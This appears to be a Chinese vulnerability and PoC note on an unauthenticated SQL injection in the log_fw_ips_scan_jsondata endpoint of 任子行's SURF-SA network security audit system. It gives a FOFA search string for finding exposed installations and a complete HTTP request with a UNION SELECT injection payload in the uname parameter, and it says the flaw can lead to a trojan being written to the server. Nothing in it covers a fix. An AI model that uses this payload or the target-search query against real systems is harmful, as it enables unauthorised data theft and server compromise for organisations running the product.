# 任子行网络安全审计系统log_fw_ips_scan_jsondata接口存在SQL注入漏洞

任子行网络安全审计系统SURF-SA系列产品是任子行为各行业提供的自主可控信息化办公环境上网行为审计的安全服务。任子行网络安全审计系统 log_fw_ips_scan_jsondata 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
title="任子行网络安全审计系统"
```

## poc

```javascript
GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1
Host: 
Referer: https://
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image-20241122152436961](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221524049.png)